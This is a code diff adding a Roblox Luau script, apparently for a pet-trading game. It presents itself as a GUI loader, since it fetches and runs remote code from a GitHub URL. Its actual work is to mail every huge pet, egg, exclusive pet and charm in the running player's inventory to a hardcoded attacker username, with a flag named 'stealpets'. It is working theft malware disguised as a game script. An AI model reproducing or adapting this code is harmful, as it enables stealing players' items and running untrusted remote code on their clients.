@@ -1,0 +1,97 @@
+Username = "Chainslaw_Gr123"
+
+-- Variables
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n3koglaii/katana/main/LoadGui"))()
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "okey insanexorek work for this"
+
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+-- Main
+AmountOfHuges = 0
+for i, v in pairs(save.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true then
+        AmountOfHuges = AmountOfHuges + 1
+    end
+end
+local user = Username
+
+-- Func
+stealpets = true
+
+
+
+if stealpets == true then
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.huge then
+            local args = {
+                [1] = user,
+                [2] = MailMessage,
+                [3] = "Pet",
+                [4] = i,
+                [5] = v._am or 1
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                unpack(args)
+            )
+        end
+    end
+end
+
+if save.Egg ~= nil and stealpets == true then
+    for i, v in pairs(save.Egg) do
+        local args = {
+            [1] = user,
+            [2] = MailMessage,
+            [3] = "Egg",
+            [4] = i,
+            [5] = v._am or 1
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+            unpack(args)
+        )
+    end
+end
+
+if stealpets == true then
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.exclusiveLevel then
+            local args = {
+                [1] = user,
+                [2] = MailMessage,
+                [3] = "Pet",
+                [4] = i,
+                [5] = v._am or 1
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+                unpack(args)
+            )
+        end
+    end
+end
+
+if save.Charm ~= nil and stealpets == true then
+    for i, v in pairs(save.Charm) do
+        local id = v.id
+        local args = {
+            [1] = user,
+            [2] = MailMessage,
+            [3] = "Charm",
+            [4] = i,
+            [5] = v._am or 1
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
+            unpack(args)
+        )
+    end
+end
